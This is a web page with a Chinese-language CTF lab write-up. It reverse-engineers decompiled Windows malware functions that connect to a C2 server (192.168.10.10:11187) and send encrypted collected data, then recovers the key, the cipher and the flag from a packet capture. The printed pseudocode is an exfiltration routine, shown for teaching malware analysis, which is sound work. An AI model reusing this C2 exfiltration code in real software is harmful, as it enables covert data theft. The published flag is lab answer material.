<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
  #


  Description
  #


請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。

  Background
  #


WSAStartup
htons
socket
sockaddr
WSAConnect


  Source Code
  #


exfiltrate
:::spoiler source
void __fastcall exfiltrate(PUCHAR pbInput)
{
  __int64 s[2]; // [rsp+28h] [rbp-10h] BYREF

  connect_to_c2(s);
  send_collected_data_to_c2(s[0], pbInput);
  shutdown(s[0], 1);
  closesocket(s[0]);
}
:::
connect_to_c2
:::spoiler source
void __fastcall connect_to_c2(unsigned __int64 *a1)
{
  unsigned __int64 v2; // rax
  struct sockaddr name; // [rsp+20h] [rbp-1B8h] BYREF
  struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF

  if ( !WSAStartup(0x202u, &amp;WSAData) )
  {
    *&amp;name.sa_data[2] = 168470720;
    *name.sa_data = htons(0x2BB3u);
    name.sa_family = 2;
    v2 = socket(2, 1, 6);
    *a1 = v2;
    connect(v2, &amp;name, 16);
  }
}
:::
send_collected_data_to_c2
:::spoiler source
void __fastcall send_collected_data_to_c2(SOCKET s, PUCHAR pbInput)
{
  char *v4; // rbx
  int v5; // esi
  int i; // eax
  char v7; // al
  int j; // ecx
  int v9; // eax

  v4 = malloc(0x4Cui64);
  *v4 = 0x11877811;
  *(v4 + 1) = 4;
  *(v4 + 2) = 0;
  if ( send(s, v4, 76, 0) > 0xB )
  {
    v5 = 0;
    while ( v5 <= 2 )
    {
      if ( recv(s, v4, 76, 0) > 0xB && *v4 == 0x11877811 )
      {
        v9 = *(v4 + 2);
        if ( v9 )
        {
          switch ( v9 )
          {
            case 1:
              *v4 = 0x11877811;
              *(v4 + 1) = 4;
              *(v4 + 2) = 1;
              encrypt_key = (v4 + 12);
              encrypt_data(pbInput);
              for ( i = 2; i <= 23; ++i )
                v4[i + 12] += v4[i + 11] - v4[i + 10];
              break;
            case 2:
              *v4 = 0x11877811;
              *(v4 + 1) = 28;
              *(v4 + 2) = 2;
              memcpy_s(v4 + 12, 0x18ui64, cipher, 0x18ui64);
              break;
            case 3:
              goto LABEL_20;
          }
        }
        else
        {
          *v4 = 0x11877811;
          *(v4 + 1) = 4;
          *(v4 + 2) = 0;
        }
        for ( j = 0; j <= 39; ++j )
        {
          v7 = v4[j + 36] + v4[43] + v4[49] - v4[67];
          v4[j + 36] = v7;
          v4[j + 36] = v4[54] - (v4[61] + v4[69]) + v7;
        }
        send(s, v4, 76, 0);
        ++v5;
      }
    }
LABEL_20:
    free(v4);
  }
}
:::


  Recon
  #



connet_to_c2
目標是取得c2 server的IP和port number"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)"><meta property="og:description" content="Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate) # Description # 請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。
Background # WSAStartup htons socket sockaddr WSAConnect Source Code # exfiltrate :::spoiler source void __fastcall exfiltrate(PUCHAR pbInput) { __int64 s[2]; // [rsp+28h] [rbp-10h] BYREF connect_to_c2(s); send_collected_data_to_c2(s[0], pbInput); shutdown(s[0], 1); closesocket(s[0]); } ::: connect_to_c2 :::spoiler source void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, &amp;WSAData) ) { *&amp;name.sa_data[2] = 168470720; *name.sa_data = htons(0x2BB3u); name.sa_family = 2; v2 = socket(2, 1, 6); *a1 = v2; connect(v2, &amp;name, 16); } } ::: send_collected_data_to_c2 :::spoiler source void __fastcall send_collected_data_to_c2(SOCKET s, PUCHAR pbInput) { char *v4; // rbx int v5; // esi int i; // eax char v7; // al int j; // ecx int v9; // eax v4 = malloc(0x4Cui64); *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; if ( send(s, v4, 76, 0) > 0xB ) { v5 = 0; while ( v5 <= 2 ) { if ( recv(s, v4, 76, 0) > 0xB && *v4 == 0x11877811 ) { v9 = *(v4 + 2); if ( v9 ) { switch ( v9 ) { case 1: *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 1; encrypt_key = (v4 + 12); encrypt_data(pbInput); for ( i = 2; i <= 23; ++i ) v4[i + 12] += v4[i + 11] - v4[i + 10]; break; case 2: *v4 = 0x11877811; *(v4 + 1) = 28; *(v4 + 2) = 2; memcpy_s(v4 + 12, 0x18ui64, cipher, 0x18ui64); break; case 3: goto LABEL_20; } } else { *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; } for ( j = 0; j <= 39; ++j ) { v7 = v4[j + 36] + v4[43] + v4[49] - v4[67]; v4[j + 36] = v7; v4[j + 36] = v4[54] - (v4[61] + v4[69]) + v7; } send(s, v4, 76, 0); ++v5; } } LABEL_20: free(v4); } } ::: Recon # connet_to_c2 目標是取得c2 server的IP和port number"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Reverse"><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#recon>Recon</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-reverse---0x232023-lab---winmalware---exfiltrate>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
<a class=anchor href=#simple-reverse---0x232023-lab---winmalware---exfiltrate>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup>WSAStartup</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons>htons</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket>socket</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2>sockaddr</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect>WSAConnect</a></li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><ul><li>exfiltrate
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>exfiltrate</span>(PUCHAR pbInput)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> s[<span style=color:#ae81ff>2</span>]; <span style=color:#75715e>// [rsp+28h] [rbp-10h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  connect_to_c2(s);
</span></span><span style=display:flex><span>  send_collected_data_to_c2(s[<span style=color:#ae81ff>0</span>], pbInput);
</span></span><span style=display:flex><span>  shutdown(s[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  closesocket(s[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li><li>connect_to_c2
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>connect_to_c2</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>a1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> name; <span style=color:#75715e>// [rsp+20h] [rbp-1B8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>WSAData</span> WSAData; <span style=color:#75715e>// [rsp+30h] [rbp-1A8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>WSAStartup(<span style=color:#ae81ff>0x202u</span>, <span style=color:#f92672>&amp;</span>WSAData) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#f92672>*&amp;</span>name.sa_data[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>168470720</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>name.sa_data <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>0x2BB3u</span>);
</span></span><span style=display:flex><span>    name.sa_family <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>=</span> socket(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>a1 <span style=color:#f92672>=</span> v2;
</span></span><span style=display:flex><span>    connect(v2, <span style=color:#f92672>&amp;</span>name, <span style=color:#ae81ff>16</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li><li>send_collected_data_to_c2
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>send_collected_data_to_c2</span>(SOCKET s, PUCHAR pbInput)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v4; <span style=color:#75715e>// rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v5; <span style=color:#75715e>// esi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v7; <span style=color:#75715e>// al
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> j; <span style=color:#75715e>// ecx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v9; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x4Cu</span>i64);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( send(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0xB</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( v5 <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( recv(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0xB</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>*</span>v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x11877811</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v9 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( v9 )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>switch</span> ( v9 )
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>              encrypt_key <span style=color:#f92672>=</span> (v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>);
</span></span><span style=display:flex><span>              encrypt_data(pbInput);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>; i <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>23</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>                v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>] <span style=color:#f92672>+=</span> v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>11</span>] <span style=color:#f92672>-</span> v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>];
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>28</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>              memcpy_s(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x18u</span>i64, cipher, <span style=color:#ae81ff>0x18u</span>i64);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>goto</span> LABEL_20;
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ( j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>39</span>; <span style=color:#f92672>++</span>j )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          v7 <span style=color:#f92672>=</span> v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>43</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>49</span>] <span style=color:#f92672>-</span> v4[<span style=color:#ae81ff>67</span>];
</span></span><span style=display:flex><span>          v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>=</span> v7;
</span></span><span style=display:flex><span>          v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>=</span> v4[<span style=color:#ae81ff>54</span>] <span style=color:#f92672>-</span> (v4[<span style=color:#ae81ff>61</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>69</span>]) <span style=color:#f92672>+</span> v7;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        send(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#f92672>++</span>v5;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>LABEL_20:
</span></span><span style=display:flex><span>    free(v4);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p><code>connet_to_c2</code>
目標是取得c2 server的IP和port number</p><ol><li>先看到#12的socket function，他代表的意思是利用IPv4並且TCP的protocol進行溝通，相關的數值說明都在<a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket>MSDN</a>，可以用前面教到的用m指令改變已知的constant名稱$\to$<code>v2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</code></li><li>接著看到connect function中的<code>&amp;name</code>，IDA原本解析成sockaddr，sockaddr是一種通用的結構格式，所以IDA解析出來的東西也沒有問題，不過如果是IPv4又是乙太網路的傳輸，會比較建議把結構改成==sockaddr_in==，<a href=https://blog.csdn.net/tao546377318/article/details/72780685>這一篇</a>探討了兩者的區別(其實就只是把sockaddr原本的結構擴展而已)，這樣的話整體分析會更好
:::spoiler 解析後<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>connect_to_c2</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>a1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr_in</span> name; <span style=color:#75715e>// [rsp+20h] [rbp-1B8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>WSAData</span> WSAData; <span style=color:#75715e>// [rsp+30h] [rbp-1A8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>WSAStartup(<span style=color:#ae81ff>0x202u</span>, <span style=color:#f92672>&amp;</span>WSAData) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    name.sin_addr.S_un.S_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xA0AA8C0</span>;      <span style=color:#75715e>// IP: 192.168.10.10
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    name.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>11187u</span>);              <span style=color:#75715e>// Port No.: 11187
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    name.sin_family <span style=color:#f92672>=</span> AF_INET;
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>a1 <span style=color:#f92672>=</span> v2;
</span></span><span style=display:flex><span>    connect(v2, <span style=color:#f92672>&amp;</span>name, <span style=color:#ae81ff>16</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::
:::info
IP: 0xA0AA8C0 $\to$ <code>192.168.10.10</code>(little endian轉十進位)
Port: <code>11187</code>
sin.family: IPv4
Protocol: TCP
:::</li></ol></li><li><p><code>send_collected_data_to_c2</code></p><ol><li>先切分程式碼的功能
<img src=https://hackmd.io/_uploads/rkci81Aza.png alt>
有時候通靈不一定很準，所以要適時的回頭檢查自己的猜測</li><li>前四行初始化的階段(malloc 0x4c然後塞三個dword)，應該是作者自定義的結構，可以利用Structures，自定義一個新的結構，大小就是0x4C，然後前三個可以定義為dd，並且把v4的結構改成packet(按Y)
<img src=https://hackmd.io/_uploads/ByQtqk0Mp.png alt></li><li>各種rename<ul><li>field_0看起來像是一個magic bytes，因為一開始附值之後，傳送過去server，再接收回來的packet也是有做驗證的動作，所以看起來是一個verification magic</li><li>field_8看起來就是接收來自server下達的command</li><li>field_C就比較多元，在case 1的時候是當作承接server給的encryption key(大小是8個bytes)，但在case 2是當作加密的cipher(大小是0x18個bytes)，所以我取名<code>enc_key_or_data</code>，另外大小是0x18(可以從memcpy的大小看出來)，所以可以按Y改變型別成<code>char[0x18]</code>
:::info
目前整體的流程
<img src=https://hackmd.io/_uploads/HJJB7gCf6.png alt>
<img src=https://hackmd.io/_uploads/BkHSXeCM6.png alt>
:::</li></ul></li></ol><hr><ol start=4><li>分析pcap
這一部就直接對照著講義上截圖或是剛剛分析的封包格式就可以知道哪一個是key哪一個是cipher
Key: <code>f0 c7 d3 0e 7f 2c 15 ba</code>
Cipher: <code>43 60 5b 5f 4e ba 9f 9e e3 78 6f 55 cb 81 24 fa e7 bf 0d 1b 3c 24 b7 4e</code>
接下來就可以直接用cipherchef的線上功能decrypt其中的內容</li></ol></li></ol><p>:::success
<img src=https://hackmd.io/_uploads/HJdetgRGp.png alt></p><p>Flag: <code>FLAG{C2_cU540m_Pr0t0C01}</code>
:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#recon>Recon</a></li></ul></nav></div></aside></main></body></html>